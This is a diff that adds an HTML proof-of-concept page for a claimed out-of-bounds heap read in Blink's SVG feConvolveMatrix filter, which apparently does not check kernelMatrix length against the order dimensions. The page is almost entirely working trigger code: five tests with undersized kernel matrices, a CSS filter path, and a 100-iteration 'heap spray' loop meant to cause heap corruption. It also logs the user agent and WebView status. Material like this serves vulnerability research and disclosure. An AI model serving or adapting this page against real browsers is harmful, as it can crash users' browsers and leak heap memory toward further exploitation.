@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SVG feConvolveMatrix OOB PoC</title>
+<style>
+  body { font-family: monospace; background: #111; color: #eee; padding: 16px; }
+  h2 { color: #0f0; }
+  .test { margin: 24px 0; border: 1px solid #333; padding: 12px; border-radius: 4px; }
+  .label { font-size: 12px; color: #aaa; margin-bottom: 8px; }
+  .trigger-btn { background: #c00; color: #fff; border: none; padding: 8px 16px;
+    border-radius: 4px; cursor: pointer; font-family: monospace; }
+  .trigger-btn:active { background: #f00; }
+  #log { background: #000; padding: 10px; margin-top: 20px; min-height: 60px;
+    border: 1px solid #333; font-size: 11px; white-space: pre-wrap; }
+  svg { display: block; border: 1px dashed #444; margin-top: 8px; }
+</style>
+</head>
+<body>
+<h2>SVG feConvolveMatrix Kernel OOB — PoC</h2>
+<p style="color:#fa0;font-size:12px">Finding #1 — Blink SVGFEConvolveMatrixElement: kernelMatrix size not validated against order dimensions.<br>
+Build(): <code>kernelMatrix = kernel_matrix_->CurrentValue()->ToFloatVector()</code> with no size check vs <code>orderX*orderY</code>.<br>
+Platform Apply() reads up to <code>orderX*orderY</code> floats from an undersized vector → OOB heap read.</p>
+
+<div id="log">— Log —</div>
+
+<!-- TEST 1: order=8x8, only 8 of 64 required kernel values provided -->
+<div class="test">
+  <div class="label">TEST 1: order="8 8", kernelMatrix has 8 values (needs 64)</div>
+  <button class="trigger-btn" onclick="runTest(1)">Trigger Test 1</button>
+  <div id="svg1"></div>
+</div>
+
+<!-- TEST 2: order=16x16, only 1 value provided -->
+<div class="test">
+  <div class="label">TEST 2: order="16 16", kernelMatrix has 1 value (needs 256)</div>
+  <button class="trigger-btn" onclick="runTest(2)">Trigger Test 2</button>
+  <div id="svg2"></div>
+</div>
+
+<!-- TEST 3: order=32x32, 0 values (empty) -->
+<div class="test">
+  <div class="label">TEST 3: order="32 32", kernelMatrix empty (needs 1024)</div>
+  <button class="trigger-btn" onclick="runTest(3)">Trigger Test 3</button>
+  <div id="svg3"></div>
+</div>
+
+<!-- TEST 4: order=4x4, 2 values (needs 16) — via CSS filter on HTML element -->
+<div class="test">
+  <div class="label">TEST 4: CSS filter path — order="4 4", 2 values (needs 16)</div>
+  <button class="trigger-btn" onclick="runTest(4)">Trigger Test 4</button>
+  <div id="svg4"></div>
+  <div id="css_target" style="width:100px;height:100px;background:red;margin-top:8px"></div>
+</div>
+
+<!-- TEST 5: Rapid fire — trigger all variants in a loop to maximise heap spray chances -->
+<div class="test">
+  <div class="label">TEST 5: Rapid-fire loop — 100 iterations of T1 to trigger heap corruption</div>
+  <button class="trigger-btn" onclick="runTest(5)">Trigger Test 5 (loop)</button>
+</div>
+
+<script>
+const log = document.getElementById('log');
+function println(msg) {
+  log.textContent += '\n' + new Date().toISOString().slice(11,23) + ' ' + msg;
+}
+
+function makeSVG(filterId, orderX, orderY, kernelValues, targetId) {
+  const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+  svg.setAttribute('width', '120');
+  svg.setAttribute('height', '120');
+  svg.setAttribute('xmlns', 'http://www.w3.org/2000/svg');
+
+  const defs = document.createElementNS('http://www.w3.org/2000/svg', 'defs');
+  const filter = document.createElementNS('http://www.w3.org/2000/svg', 'filter');
+  filter.setAttribute('id', filterId);
+  filter.setAttribute('color-interpolation-filters', 'sRGB');
+
+  const fe = document.createElementNS('http://www.w3.org/2000/svg', 'feConvolveMatrix');
+  fe.setAttribute('in', 'SourceGraphic');
+  fe.setAttribute('order', orderX + ' ' + orderY);
+  fe.setAttribute('kernelMatrix', kernelValues);
+  fe.setAttribute('divisor', '1');
+  fe.setAttribute('bias', '0');
+  fe.setAttribute('preserveAlpha', 'false');
+
+  filter.appendChild(fe);
+  defs.appendChild(filter);
+  svg.appendChild(defs);
+
+  // A visible rect to force filter evaluation
+  const rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
+  rect.setAttribute('width', '120');
+  rect.setAttribute('height', '120');
+  rect.setAttribute('fill', 'rgba(255,100,0,0.8)');
+  rect.setAttribute('filter', 'url(#' + filterId + ')');
+  svg.appendChild(rect);
+
+  // Also add an image element to force raster content through the filter
+  const img = document.createElementNS('http://www.w3.org/2000/svg', 'image');
+  img.setAttribute('x', '10'); img.setAttribute('y', '10');
+  img.setAttribute('width', '100'); img.setAttribute('height', '100');
+  img.setAttribute('preserveAspectRatio', 'none');
+  img.setAttribute('filter', 'url(#' + filterId + ')');
+  // Inline 1x1 red PNG so filter runs on pixel data
+  img.setAttribute('href', 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI6QAAAABJRU5ErkJggg==');
+  svg.appendChild(img);
+
+  const container = document.getElementById(targetId);
+  container.innerHTML = '';
+  container.appendChild(svg);
+}
+
+function runTest(n) {
+  println('Running Test ' + n + '...');
+  try {
+    switch(n) {
+      case 1:
+        makeSVG('f1_' + Date.now(), 8, 8, '1 0 0 0 0 0 0 0', 'svg1');
+        // also try via innerHTML to exercise parser path
+        document.getElementById('svg1').insertAdjacentHTML('beforeend',
+          '<svg width="10" height="10"><filter id="fi1"><feConvolveMatrix in="SourceGraphic" order="8 8" kernelMatrix="1 0 0 0 0 0 0 0"/></filter><rect width="10" height="10" fill="blue" filter="url(#fi1)"/></svg>');
+        println('Test 1 injected — 8x8 order, 8 of 64 values');
+        break;
+      case 2:
+        makeSVG('f2_' + Date.now(), 16, 16, '1', 'svg2');
+        println('Test 2 injected — 16x16 order, 1 of 256 values');
+        break;
+      case 3:
+        makeSVG('f3_' + Date.now(), 32, 32, '', 'svg3');
+        println('Test 3 injected — 32x32 order, 0 of 1024 values');
+        break;
+      case 4: {
+        // CSS filter path: reference an SVG filter from a stylesheet on an HTML element
+        const svgEl = document.createElementNS('http://www.w3.org/2000/svg','svg');
+        svgEl.setAttribute('width','0'); svgEl.setAttribute('height','0');
+        svgEl.style.position = 'absolute';
+        const defs = document.createElementNS('http://www.w3.org/2000/svg','defs');
+        const filt = document.createElementNS('http://www.w3.org/2000/svg','filter');
+        const fid = 'cssf_' + Date.now();
+        filt.setAttribute('id', fid);
+        const fe = document.createElementNS('http://www.w3.org/2000/svg','feConvolveMatrix');
+        fe.setAttribute('order','4 4'); fe.setAttribute('kernelMatrix','1 0');
+        fe.setAttribute('in','SourceGraphic'); fe.setAttribute('divisor','1');
+        filt.appendChild(fe); defs.appendChild(filt); svgEl.appendChild(defs);
+        document.getElementById('svg4').appendChild(svgEl);
+        document.getElementById('css_target').style.filter = 'url(#' + fid + ')';
+        println('Test 4 injected — CSS filter path, 4x4 order, 2 of 16 values');
+        break;
+      }
+      case 5: {
+        println('Test 5 — rapid-fire 100 iterations...');
+        for (let i = 0; i < 100; i++) {
+          const wrapper = document.createElement('div');
+          wrapper.style.width = '1px'; wrapper.style.height = '1px';
+          wrapper.style.overflow = 'hidden'; wrapper.style.position = 'absolute';
+          wrapper.style.left = '-9999px';
+          const fid = 'rf_' + i + '_' + Date.now();
+          wrapper.innerHTML = '<svg width="8" height="8" xmlns="http://www.w3.org/2000/svg">'
+            + '<filter id="' + fid + '"><feConvolveMatrix in="SourceGraphic" order="8 8"'
+            + ' kernelMatrix="1 0 0 0 0 0 0 0"/></filter>'
+            + '<rect width="8" height="8" fill="green" filter="url(#' + fid + ')"/></svg>';
+          document.body.appendChild(wrapper);
+        }
+        println('Test 5 — 100 SVG filter nodes created; forcing layout...');
+        // Force style/layout to ensure filters are evaluated
+        document.body.getBoundingClientRect();
+        println('Test 5 — layout forced. Watch for crash/tombstone.');
+        break;
+      }
+    }
+  } catch(e) {
+    println('JS exception: ' + e);
+  }
+}
+
+println('Page loaded. Device: ' + navigator.userAgent);
+println('WebView: ' + (navigator.userAgent.indexOf('wv') !== -1 ? 'YES' : 'browser'));
+println('Press a test button to trigger filter evaluation.');
+</script>
+</body>
+</html>
